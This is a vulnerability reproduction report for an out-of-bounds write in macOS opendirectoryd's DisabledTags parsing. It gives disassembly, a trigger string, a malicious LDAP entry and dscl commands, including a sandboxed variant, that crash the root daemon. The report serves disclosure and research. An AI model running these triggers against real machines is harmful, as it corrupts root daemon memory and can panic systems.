# opendirectoryd DisabledTags auth-authority OOB-write - Reproduction

Tested on macOS 26.5.1 25F80, `opendirectoryd-966.100.2`.

## Root Cause

`__authauthority_parse_authdata`, AuthenticationAuthority tag type 9 (`DisabledTags`), parses a comma-separated token list and stores each token's enum value into a fixed six-entry inline `uint32_t` array inside the 0x38-byte `odauthauthority` slot, with no capacity check:

```text
0x100031c40  ldr x8,[x21]              ; count at slot+0x18
0x100031c44  str w24,[x22,x8,lsl#2]    ; array[count] = enum, x22 = slot+0x20
0x100031c4c  add x8,x8,#1
0x100031c50  str x8,[x21]
```

The slot is 0x38 bytes. The inline list at `slot+0x20..slot+0x38` holds six `uint32_t` values. The seventh comma token writes past the slot into the adjacent authority slot / 0x238-byte aggregate, then beyond it if enough tokens are provided. `_odauthauthorities_remove_disabledtag` uses `#0x6/#0x5` cap math, confirming the intended capacity.

## Trigger Value

```text
;DisabledTags;ShadowHash,ShadowHash,ShadowHash,...
```

Seven tokens are enough to corrupt the next authority slot. Hundreds of tokens were used for hard crashes.

## Reachability

`AuthenticationAuthority` is in `opendirectoryd`'s default authentication attribute fetch set. Ordinary verify/authentication flows parse this attribute for the targeted record, including records supplied by an LDAP/OpenDirectory node.

## Repro A: Dynamic LDAP / Network-Supplied Record

This path proves non-root and sandbox-triggered root daemon memory corruption through an explicit dynamic LDAP node name.

On this host, there was no persistent LDAP host configuration under `/Library/OpenDirectory/Configurations` or `/Library/Preferences/OpenDirectory/Configurations`; only `Contacts.plist` and `Search.plist` existed in the user-writable preference location. The explicit node `/LDAPv3/127.0.0.1` is materialized from Apple's system dynamic node template:

```text
/System/Library/OpenDirectory/DynamicNodeTemplates/LDAPv3.plist
comment: "Dynamic LDAPv3 node"
enabled: true
template: "Open Directory Server"
```

The `Open Directory Server` template uses the `Open Directory` mapping, where `dsAttrTypeStandard:AuthenticationAuthority` for `dsRecTypeStandard:Users` maps to LDAP `authAuthority`.

1. Start a malicious LDAP fixture serving:

```text
dn: uid=victim,cn=users,dc=evil,dc=test
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
objectClass: apple-user
objectClass: extensibleObject
authAuthority: ;DisabledTags;<many comma tokens>
```

2. Confirm harmless explicit-node resolution as a non-root user:

```text
dscl /LDAPv3/127.0.0.1 -read /Users/victim RecordName UniqueID PrimaryGroupID NFSHomeDirectory
```

This uses the dynamic `/LDAPv3/<host>` node path; it does not require adding the host to the global authentication/contact search policy.

3. Trigger as a non-root client:

```text
dscl /LDAPv3/127.0.0.1 -authonly victim wrongpass
```

4. Trigger from a constrained sandboxed client:

```text
sandbox-exec -p '(version 1)
(deny default)
(allow process*)
(allow file-read*)
(allow file-map-executable)
(allow mach-lookup (global-name "com.apple.system.opendirectoryd.api"))
(allow sysctl-read)
(allow signal (target self))' \
  /usr/bin/dscl /LDAPv3/127.0.0.1 -authonly victim wrongpass
```

Observed sandboxed run:

```text
sandbox dscl rc=62
od before=77590 runs=11 crashes=10
od after=89292 runs=12 crashes=11 signal=Segmentation fault: 11
<dscl_cmd> DS Error: -14910 (eServerError)
Authentication for node /LDAPv3/127.0.0.1 failed. (-14910, eServerError)
```

## Repro B: Local Record

This confirms the corruption but requires root to set the malicious local record attribute, so it is not a privilege escalation by itself.

```text
sudo dscl . -create /Users/_probe AuthenticationAuthority ";DisabledTags;<many comma tokens>"
dscl . -authonly _probe wrongpass
```

Observed: root `opendirectoryd` SIGSEGV.

## Evidence

- `opendirectoryd_SIGSEGV_log_evidence.txt`: launchd records of root `opendirectoryd` SIGSEGV crashes.
- `static_oob_analysis.txt`: uncapped store disassembly.
- `network_ldap_sandbox_20260611T1938EDT/`: LDAP fixture, sandbox trigger output, launchctl state, and victim LDAP entry.
- `EXPLOITABILITY.md` and `EXPLOITABILITY_TRIAGE.md`: current LPE assessment and static layout notes.

## Safety

Do not run repeated triggers on a primary machine. `opendirectoryd` has:

```text
_PanicOnCrash => {
  PanicOnConsecutiveCrash => true
}
```

On this host, ReportCrash did not emit a fresh `.ips` file. The captured launchd SIGSEGV lines and `launchctl print` state are the available crash evidence.
